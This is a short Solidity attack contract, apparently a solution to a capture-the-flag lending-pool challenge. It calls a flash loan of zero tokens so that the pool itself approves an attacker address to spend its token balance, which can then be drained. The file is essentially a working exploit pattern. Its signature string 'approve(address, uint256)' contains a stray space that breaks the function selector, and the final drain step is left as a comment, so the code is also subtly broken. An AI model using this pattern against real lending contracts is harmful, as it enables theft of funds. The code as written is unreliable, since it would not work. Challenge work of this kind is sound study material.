// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./TrusterLenderPool.sol";
import "hardhat/console.sol";

// interface ITrusterLenderPool {
//     function flashloan(
//         uint256 borrowAmount,
//         address borrower,
//         address target,
//         bytes calldata data
//     )external;
// }
contract TrusterAttacker {
    TrusterLenderPool public pool;
    IERC20 public DVTtoken;

    constructor(address _tokenAdress, address _poolAddress) {
        DVTtoken = IERC20(_tokenAdress);
        pool = TrusterLenderPool(_poolAddress);
    }

    function hack(uint256 amount, address attacker) external {
        pool.flashLoan(
            0,
            address(this),
            address(DVTtoken),
            abi.encodeWithSignature(
                "approve(address, uint256)",
                attacker,
                amount
            )
        );
        
        //as we got approved, we can now use transferFrom to wihdraw the tokens
    }

    receive() external payable {}
}
